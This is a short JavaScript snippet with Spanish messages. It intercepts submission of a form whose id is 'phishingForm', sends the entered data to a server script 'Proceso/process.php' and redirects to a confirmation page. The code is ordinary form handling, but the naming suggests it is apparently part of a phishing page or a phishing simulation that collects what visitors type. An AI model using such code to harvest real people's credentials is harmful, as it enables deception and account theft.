document.getElementById("phishingForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const formData = new FormData(this);

    fetch("Proceso/process.php", {
        method: "POST",
        body: formData,
    })
        .then((response) => {
            if (!response.ok) {
                throw new Error(`Error HTTP: ${response.status}`);
            }
            return response.json();
        })
        .then((data) => {
            if (data.status === "success") {
                window.location.href = "Proceso/confirmacion.html";
            } else {
                alert(`Error: ${data.message}`);
            }
        })
        .catch((error) => {
            console.error("Error al enviar el formulario:", error);
            alert("Hubo un problema al enviar el formulario.");
        });
});


